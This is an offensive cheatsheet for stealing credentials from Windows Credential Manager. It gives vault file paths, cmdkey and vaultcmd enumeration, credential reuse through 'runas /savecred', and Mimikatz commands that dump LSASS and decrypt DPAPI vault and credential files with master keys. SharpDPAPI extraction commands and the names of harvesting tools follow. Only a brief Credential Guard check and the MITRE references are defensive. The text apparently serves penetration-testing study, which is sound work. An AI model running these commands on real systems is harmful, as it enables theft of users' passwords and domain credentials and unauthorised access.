# Cheatsheet — Attacking Windows Credential Manager

## Credential Vault Locations

```powershell
# User vaults
%UserProfile%\AppData\Local\Microsoft\Vault\
%UserProfile%\AppData\Roaming\Microsoft\Vault\
%UserProfile%\AppData\Local\Microsoft\Credentials\

# System vaults
%ProgramData%\Microsoft\Vault\
%SystemRoot%\System32\config\systemprofile\AppData\Roaming\Microsoft\Vault\
```

## Built-in Windows Commands

| Command | Purpose |
|---------|---------|
| `vaultcmd /list` | List available vaults |
| `vaultcmd /listcreds:"Vault Name"` | List credentials in specific vault |
| `rundll32 keymgr.dll,KRShowKeyMgr` | Open legacy credential GUI |
| `control /name Microsoft.CredentialManager` | Open Credential Manager (Win 10/11) |
| `cmdkey /list` | List stored credentials via command line |

## cmdkey — Enumerate Stored Credentials

```cmd
cmdkey /list
```

Output format:
```
Target: Domain:interactive=SRV01\username
Type: Domain Password
User: SRV01\username
Persistence: Local machine persistence
```

**Reuse stored credential with runas:**
```cmd
runas /savecred /user:DOMAIN\username cmd
```
This launches a new cmd as the stored user — no password prompt if `/savecred` was previously used.

**Open legacy credential GUI:**
```cmd
rundll32 keymgr.dll,KRShowKeyMgr
```

## Mimikatz — sekurlsa::credman (Memory Dump)

```cmd
mimikatz.exe
privilege::debug
sekurlsa::credman
```

Dumps Credential Manager entries from LSASS memory — extracts cached credentials for web logins (OneDrive, etc.) and domain interactive sessions.

**Full sekurlsa dump (all credential types):**
```cmd
sekurlsa::msv
sekurlsa::kerberos
sekurlsa::wdigest
sekurlsa::logonpasswords
```

## Mimikatz DPAPI Commands

```bash
# List vaults
vault::list

# Dump vault credentials
dpapi::vault /in:"C:\Users\USER\AppData\Roaming\Microsoft\Vault\GUID\vault.vcred"

# Dump credential files
dpapi::cred /in:"C:\Users\USER\AppData\Local\Microsoft\Credentials\CRED_FILE"

# Work with master keys
dpapi::masterkey /in:"C:\Users\USER\AppData\Roaming\Microsoft\Protect\SID\GUID"
dpapi::masterkey /in:"path" /password:USER_PASSWORD
dpapi::masterkey /in:"path" /system:SYSTEM_BACKUP_KEY

# Decrypt with master key
dpapi::cred /masterkey:MASTER_KEY_DATA
```

## Credential Manager — Two Types

| Type | Used By | Example |
|------|---------|---------|
| **Web Credentials** | Internet Explorer, legacy Edge | Cached site logins |
| **Windows Credentials** | OneDrive, domain logins, SMB shares, services | `Domain:interactive=SRV01\user` |

## Additional Tools

| Tool | Purpose |
|------|---------|
| **SharpDPAPI** | C# DPAPI extraction (GhostPack) |
| **LaZagne** | Multi-application credential harvester |
| **DonPAPI** | Domain-wide DPAPI exploitation |

```bash
# Extract all credentials
SharpDPAPI.exe credentials

# With user password
SharpDPAPI.exe credentials /password:PASSWORD

# With specific master key
SharpDPAPI.exe credentials /masterkey:KEY_FILE

# Target specific credential file
SharpDPAPI.exe credentials /target:"C:\path\to\credential"
```

## Credential Guard Detection

```powershell
# Check if Credential Guard is enabled
Get-WmiObject -Class "Win32_DeviceGuard" -Namespace "Root\CIMv2\Security\MicrosoftTpm"

# Check systeminfo
systeminfo | findstr "Credential Guard"

# Registry check (may not be reliable)
Get-ItemProperty -Path "HKLM:\SOFTWARE\Policies\Microsoft\Windows\DeviceGuard" -Name "LsaCfgFlags"
```

## File Types

| File | Purpose |
|------|---------|
| `Policy.vpol` | Vault policy with AES encryption keys |
| `vault.vcred` | Vault credential entries |
| `*.vcrd` | Individual credential files |

## References

- MITRE ATT&CK: T1555.004 (Credentials from Password Stores: Windows Credential Manager)
- Microsoft: [Credentials Processes in Windows Authentication](https://learn.microsoft.com/en-us/windows-server/security/windows-authentication/credentials-processes-in-windows-authentication)
- gentilkiwi/mimikatz wiki
- GhostPack/SharpDPAPI
